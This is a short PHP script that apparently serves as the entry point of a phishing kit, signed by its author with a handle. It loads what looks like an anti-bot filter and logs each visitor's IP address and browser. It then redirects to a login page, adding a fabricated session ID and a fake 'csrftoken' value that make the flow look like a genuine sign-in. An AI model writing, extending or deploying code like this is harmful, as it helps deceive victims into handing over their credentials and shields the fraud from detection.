<?php        //////BY ICI C'EST BRAZARD ///@LOVREZZ§§§///
include './server/ab.php';
session_start();
class GenNewId
{
    function __construct()
    {
        $_SESSION['ID'] = md5(random_int(111111,999999));
        $_SESSION['IP'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['UA'] = $_SERVER['HTTP_USER_AGENT'];
        $url = "location: ./app/login/index.php?session_id=" . $_SESSION['ID'] . '&method=login&csrftoken=$5$12$'. md5(random_int(111111,999999));
        header($url);
    }
}

$data = new GenNewId();
?>